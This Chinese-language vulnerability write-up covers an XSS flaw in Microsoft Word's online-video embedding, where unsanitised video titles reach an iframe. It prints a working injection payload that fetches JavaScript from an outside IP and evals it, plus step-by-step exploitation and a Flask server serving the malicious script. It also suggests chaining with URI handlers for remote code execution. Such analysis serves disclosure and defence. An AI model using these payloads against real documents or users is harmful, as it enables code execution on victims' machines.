---
title: 2023 Microsoft Office XSS
published: 2024-02-11 23:57
category: Web
draft: false
tags: [XSS, Office, 漏洞分析]
---

## 背景介绍

在服务器中，当从攻击者指定的链接解析视频时，视频标题中包含的恶意Payload可触发 XSS 攻击，从而允许执行任意 Javascript 代码。

## 环境说明

产品：Office Word，包括Office 365 Word
测试版本：Microsoft Word for Microsoft 365 MSO (Version 2306 Build 16.0.16529.20164) 64-bit
Bug类别：XSS（跨站脚本）

## 漏洞详情

包括 MS Word 在内的各种 Office 产品允许用户通过"在线视频"选项卡将所需的外部视频插入到文档中。

![](/images/posts/microsoft-office-xss/1.png)

![](/images/posts/microsoft-office-xss/2.png)

当用户播放嵌入在文档中的外部视频时，Office 会检查外部视频的提供商是否值得信赖，例如 YouTube，此检查是通过将以下正则表达式应用于 URL 来执行的。

```
https?://(www\.)?youtube\.\w{2,3}/.*|https?://(www\.)?youtube-nocookie\.\w{2,3}/.*|https?://youtu\.be/.*|https?://(player\.)?vimeo\.com/.*|https?://(\w+\.)?slideshare\.net/.*|https?://(\w+\.)?microsoftstream\.com/.*
```

如果它被认为是可信的，就会发送如下请求来获取视频标题或缩略图等数据。

```http
GET https://hubble.officeapps.live.com/mediasvc/api/media/oembed?url=https%3A%2F%2Fwww.youtube.com%2Fembed%2FGX2nEmvxK-4%3Ffeature%3Doembed&streamsso=true&lcid=1033&syslcid=1042&uilcid=1033&app=0&ver=16&build=16.0.16529&platform=Win32 HTTP/1.1
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.16529; Pro)
X-IDCRL_ACCEPTED: t
X-Office-Version: 16.0.16529
X-Office-Application: 0
X-Office-Platform: Win32
X-Office-AudienceGroup: Production
X-Office-SessionId: DE75B69F-49BA-4D92-BD45-2B02504B4021
Host: hubble.officeapps.live.com
```

以上是来自 hubble.officeapps.live.com 上的服务器响应信息，包括视频的标题、描述和用于播放视频的 HTML iframe 标记。

该漏洞问题在于 iframe 标记，服务器将视频的标题添加到 iframe 标记的"title"属性中，无需任何验证，因此，通过适当地使用双引号，我们就可以自由地将 onload 属性添加到服务器响应的 iframe 标记中。

以下是 officeapps.live.com 服务器对恶意外部视频的响应示例：

```json
{
    "description": "",
    "video_description": "",
    "start_time": null,
    "end_time": null,
    "embed_url": "https://www.youtube.com/embed/GX2nEmvxK-4?feature=oembed",
    "html": "<iframe width=\"200\" height=\"150\" src=\"https://www.youtube.com/embed/GX2nEmvxK-4?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen=\"\" title=\"\" onload=\"fetch('http://158.247.239.32/a.js').then(function(a){a.text().then(function(a){eval(a)})})\" sandbox=\"allow-scripts allow-same-origin allow-popups\"></iframe>",
    "type": "video",
    "title": "\" onload=\"fetch('http://127.0.0.1/a.js').then(function(a){a.text().then(function(a){eval(a)})})",
    "provider_name": "YouTube",
    "provider_url": "https://www.youtube.com/",
    "thumbnail_url": "https://i.ytimg.com/vi/GX2nEmvxK-4/hqdefault.jpg",
    "thumbnail_width": 480.0,
    "thumbnail_height": 360.0,
    "width": 200.0,
    "height": 150.0
}
```

根据该响应，Word 会在 `%LOCALAPPDATA%\Microsoft\Windows\INetCache\Content.Word` 目录中写入要通过 Edge Webview 呈现的 HTML 文件。

结果可想而知，这个 HTML 将包含攻击者注入的 JS 代码。 （此逻辑在 wwlib!XszCreateVideoHTML 中实现，具体可自行Google）

如上所示，iframe 的沙箱属性设置了allow-scripts、allow-same-origin 和allow-popups，这意味着可以执行 JavaScript，可以通过 window.open 运行所需的 URI，或者可以通过 fetch 方法执行来自外部的服务器脚本。

## EXP开发

如漏洞描述中的示例所示，创建一个 YouTube 视频，其标题包含用于插入 onload 属性的Payload：

```
" onload="fetch('[http://127.0.0.1/a.js](http://127.0.0.1/a.js)').then(function(a){a.text().then(function(a){eval(a)})})
```

第1步：单击 Word 中的"在线视频"选项卡，然后将恶意视频的 URL 插入到文档中

![](/images/posts/microsoft-office-xss/3.png)

第2步：设置一个简单的 Web 服务器，允许 CORS 并使用恶意 JavaScript 进行响应，如下所示。 （本示例通过计算器 URI 方案执行 calc.exe。）

```python
from flask import Flask

app = Flask(__name__)

@app.after_request
def apply_cors(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

@app.route('/a.js', methods=['GET'])
def exploit():
    return 'window.open("calculator://")'
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

# **结论**

- 该漏洞表明，攻击者可以创建包含特定视频的 Word 文档，并在播放视频时执行任意 javascript 代码
- Office 过去的关键漏洞，如 CVE-2021-40444 和 CVE-2022-30190 (Folina)，都是从执行任意 javascript 开始的
- 如果它与新的易受攻击的 URI 结合，例如之前被利用的 ms-msdt，则可能会直接导致严重的 RCE（远程代码执行）漏洞
- 尤其是当播放Word中嵌入的视频时触发的漏洞，攻击者很容易诱导用户播放视频
